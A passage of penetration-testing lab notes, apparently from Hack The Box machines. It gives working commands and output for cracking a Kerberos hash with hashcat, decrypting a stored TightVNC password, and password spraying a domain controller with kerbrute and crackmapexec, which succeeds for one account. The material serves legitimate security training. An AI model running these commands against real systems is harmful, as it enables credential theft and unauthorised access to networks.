   Default Gateway . . . . . . . . . : 192.168.50.254
```
{% endcode %}



## Hash from kerberos ticket

```
hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force

```

## Cracking TightVNC password



Some reading about TightVNC shows that it stores the password in the register encrypted with a static key. There’s a bunch of tools out there to do it. I used [this](https://github.com/jeroennijhof/vncpwd). It takes a file with the ciphertext, which I created with `echo '6bcf2a4b6e5aca0f' | xxd -r -p > vnc_enc_pass`:

```
root@kali# /opt/vncpwd/vncpwd vnc_enc_pass
Password: sT333ve2
```

## Password Spray

### kerbrute - DOES NOT WORK EVERYTIME

```
~/tools/kerbrute passwordspray users NewIntelligenceCorpUser9876 --dc 10.129.95.154 -d intelligence.htb

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/19/22 - Ronnie Flathers @ropnop

2022/06/19 10:03:24 >  Using KDC(s):
2022/06/19 10:03:24 >   10.129.95.154:88

2022/06/19 10:03:25 >  Done! Tested 84 logins (0 successes) in 1.460 seconds
```

### crackmapexec smb - WORKS

```
crackmapexec smb 10.129.95.154 -u ../users -p NewIntelligenceCorpUser9876
SMB         10.129.95.154   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.95.154   445    DC               [-] intelligence.htb\administrator:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\thomas.hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\lorem:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\ipsum:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\lorem.ipsum:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\cicero:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\david.wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.129.95.154   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```
